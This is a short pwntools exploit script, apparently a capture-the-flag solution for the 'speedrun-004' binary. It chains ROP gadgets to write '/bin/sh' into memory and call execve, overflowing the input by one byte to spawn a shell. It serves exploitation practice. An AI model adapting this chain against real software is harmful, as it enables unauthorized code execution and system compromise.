'''
Author: Samrito
Date: 2022-03-07 16:43:20
LastEditors: Samrito
LastEditTime: 2022-03-07 17:42:21
'''
import io
from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'


def debug(argv=''):
    gdb.attach(io, argv)
    pause()


io = process(argv=['./speedrun-004'])

ret_addr = 0x400416  # ret;

mov_rax_rdx = 0x48d301  #mov dword ptr [rax], edx; ret;
bss_addr = 0x6BB310  # w
pop_rdi = 0x400686  # pop rdi; ret;
pop_rax = 0x415f04  # pop rax; ret;
syscall = 0x40132c  #syscall
pop_rdx = 0x44c6b6  #pop rdx; ret;
pop_rsi = 0x410a93  #pop rsi; ret;

payload1 = flat([
    pop_rdx, 0x0068732f6e69622f, pop_rax, bss_addr, mov_rax_rdx, pop_rdi,
    bss_addr, pop_rdx, 0, pop_rsi, 0, pop_rax, 0x3b, syscall
])
payload = flat(
    [p64(ret_addr) * int((0x100 - len(payload1)) / 8), payload1, b'\x00'])

#debug('b * 0x400BAA')
io.recvuntil(b'how much do you have to say?\n')
io.sendline(b'257')
io.recvuntil(b'Ok, what do you have to say for yourself?\n')
io.sendline(payload)

io.interactive()